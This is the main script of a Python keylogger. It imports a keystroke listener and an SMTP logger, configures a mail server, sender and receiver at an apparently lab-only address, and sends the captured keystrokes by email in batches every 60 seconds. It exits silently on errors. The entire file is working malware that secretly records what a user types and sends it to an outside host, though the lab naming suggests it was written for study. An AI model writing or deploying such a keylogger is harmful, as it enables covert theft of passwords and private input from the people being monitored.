from utils.logger import SMTPLogger
from core.listener import Keystrokelistener
import sys
import signal

# SMTP Configuration
SMTP_SERVER = "172.16.0.2"
SMTP_PORT = 25
SENDER_EMAIL = "testuser@jakoutbadr.lab"
SENDER_PASSWORD = "c"
RECEIVER_EMAIL = "testuser@jakoutbadr.lab"
BUFFER_SIZE = 100
SEND_INTERVAL = 60

logger = None
listener = None

def signal_handler(signum, frame):
    global logger, listener
    if logger:
        logger.shutdown()
    if listener:
        listener.stop()
    sys.exit(0)

def main():
    global logger, listener
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        logger = SMTPLogger(
            smtp_server=SMTP_SERVER,
            smtp_port=SMTP_PORT,
            sender_email=SENDER_EMAIL,
            sender_password=SENDER_PASSWORD,
            receiver_email=RECEIVER_EMAIL,
            buffer_size=BUFFER_SIZE,
            send_interval=SEND_INTERVAL
        )
        
        listener = Keystrokelistener(on_press_callback=logger.log_keystroke)
        listener.start()
        listener.join()
    except Exception:
        sys.exit(0)

if __name__ == "__main__":
    main()
